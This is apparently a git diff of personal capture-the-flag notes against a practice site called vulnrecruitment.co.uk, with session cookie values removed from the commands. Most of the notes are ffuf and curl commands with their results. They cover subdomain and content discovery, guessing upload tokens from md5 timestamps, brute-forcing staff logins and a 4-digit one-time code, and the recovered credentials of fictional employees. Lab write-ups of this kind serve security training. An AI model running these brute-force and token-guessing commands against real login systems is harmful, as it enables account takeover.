@@ -2,8 +2,6 @@ domain ip: 68.183.255.206
 domain name: http://www.vulnrecruitment.co.uk/
 server: nginx/1.21.1 (Ubuntu)
 
-Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9
-
 dnsrecon -d vulnrecruitment.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 //Subdomains found: admin.vulnrecruitment.co.uk
@@ -12,22 +10,22 @@ curl admin.vulnrecruitment.co.uk -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVn
 
 Contents discovery (admin.vulnrecruitment.co.uk):
 
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhOb GZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://admin.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie:" -w ~/wordlists/content.txt -u "http://admin.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
 //no relevant content found. I guess I have to figure out how to overpass 
 //denied access...
 
 
 Contents discovery (www.vulnrecruitment.co.uk):
 
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie: " -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
 //content found: staff.
 
 Contents discovery (www.vulnrecruitment.co.uk/staff):
 
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/staff/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie: " -w ~/wordlists/content.txt -u "http://www.vulnrecruitment.co.uk/staff/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
 //content found: portal, [id]/image.
 
-curl -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" "http://www.vulnrecruitment.co.uk/staff/2/image?id=1" -v  
+curl -H "Cookie: " "http://www.vulnrecruitment.co.uk/staff/2/image?id=1" -v  
 //404 - Resource (http://b38f1-uploads.vulnrecruitment.co.uk/uploads/2_1.jpg) not found    
 
 //entering http://b38f1-uploads.vulnrecruitment.co.uk/...
@@ -43,12 +41,12 @@ id4 : 33379393610f7c99f05c85f9f92deaef md5 -> 19:33
 
 //creating a file with all timestamps...
 //FUZZING...
-ffuf -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/id_tokens.txt -u "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_FUZZ.jpg" -t 1 -p 0.1 -mc all -fc 404 -c
+ffuf -H "Cookie: ctfchallenge=" -w ~/id_tokens.txt -u "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_FUZZ.jpg" -t 1 -p 0.1 -mc all -fc 404 -c
 //Token for 3rd employee: d9a39bb5097e8e57d4da9669ea44fd72
 
 //entering http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg...
 
-curl "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg" -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9"
+curl "http://b38f1-uploads.vulnrecruitment.co.uk/uploads/3_d9a39bb5097e8e57d4da9669ea44fd72.jpg" -H "Cookie:"
 //uhmm... it's just her photo in matrix sunglasses.
 //Extracting metadata with brandfolder.com...
 
@@ -91,7 +89,7 @@ employees.txt
 
 //FUZZING login page form with a cluster bomb
 
-ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/employees.txt:FUZZ1 -2 ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: " -w ~/employees.txt:FUZZ1 -2 ~/wordlists/passwords.txt:FUZZ2 -d "email=FUZZ1&password=FUZZ2" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
 
 //Credentials found: 
 email: archie.bentley@vulnrecruitment.co.uk
@@ -104,7 +102,7 @@ curl -X POST -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder" 
 //creating file containing 4 digit numbers
 digits.txt
 
-ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/digits.txt -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder&attempt=2&otp=9564" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid 4 digit security code" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: " -w ~/digits.txt -d "email=archie.bentley%40vulnrecruitment.co.uk&password=thunder&attempt=2&otp=9564" -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid 4 digit security code" -t 1 -p 0.1 -mc all -fc 404 -c -o result
 
 //4 digit number found: 3798
 //Loging in with security number...
@@ -114,7 +112,7 @@ ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfc
 //Lost employee found: amelia.nixon@vulnrecruitment.co.uk
 
 //Fuzzing login page with email: amelia.nixon@vulnrecruitment.co.uk
-ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnFkalZwZDNGNGRDSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiJkM2Y4NDQzZDI5ODZhYzIyYzFkZmMxOTJlYmJlZWY1MyJ9" -w ~/wordlists/passwords.txt -d "email=amelia.nixon@vulnrecruitment.co.uk&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
+ffuf -X POST -u http://vulnrecruitment.co.uk/staff/portal/login -H "Cookie: " -w ~/wordlists/passwords.txt -d "email=amelia.nixon@vulnrecruitment.co.uk&password=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -fr ">Invalid email / password combination" -t 1 -p 0.1 -mc all -fc 404 -c -o result
 //password found: zxcvbn
 
 //Logging in with credentials...
